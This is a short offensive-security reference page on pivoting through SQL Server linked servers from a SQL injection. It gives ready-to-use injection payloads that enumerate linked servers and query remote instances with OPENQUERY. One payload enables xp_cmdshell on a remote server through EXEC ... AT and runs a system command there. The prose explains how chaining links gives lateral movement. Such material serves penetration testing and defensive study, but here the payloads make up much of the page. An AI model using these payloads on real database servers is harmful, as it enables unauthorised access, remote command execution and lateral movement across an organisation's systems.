---
title: "Pivoting through SQL Server linked servers"
description: "Abusing SQL Server linked servers from an injection: enumerating links, running queries and commands on remote instances with openquery and RPC, and chaining links."
keywords:
  - linked servers
  - openquery
  - RPC out
  - EXECUTE AT
  - lateral movement
---

# Trusted links

Linked servers let one SQL Server run queries on another, often under a configured login that is more privileged on the remote side. An injection on one instance can therefore pivot to others, sometimes gaining `sysadmin` on a target where the local login has none.

Enumerate the configured links:

```sql
' UNION SELECT srvname,NULL,NULL FROM master..sysservers-- 
```

Run a query on a link with `OPENQUERY`, which reveals the remote context:

```sql
' UNION SELECT NULL,NULL,* FROM OPENQUERY([REMOTE],'SELECT @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')')-- 
```

If the link is configured to run as a privileged remote login, command execution on the remote follows. Links that have RPC Out enabled accept `EXEC ... AT`, which runs an arbitrary statement remotely:

```sql
'; EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [REMOTE]-- 
```

Links can be chained: `OPENQUERY` nested through several hops reaches instances not directly linked to the entry point, and the effective privilege on each hop is whatever that link's configured login holds. This makes linked-server abuse a primary lateral-movement path in SQL Server estates, independent of whether the entry instance's own login is privileged.

## References

- Microsoft SQL Server Documentation: linked servers, OPENQUERY, sp_serveroption (RPC Out)
- OWASP Testing Guide: Testing for SQL Injection
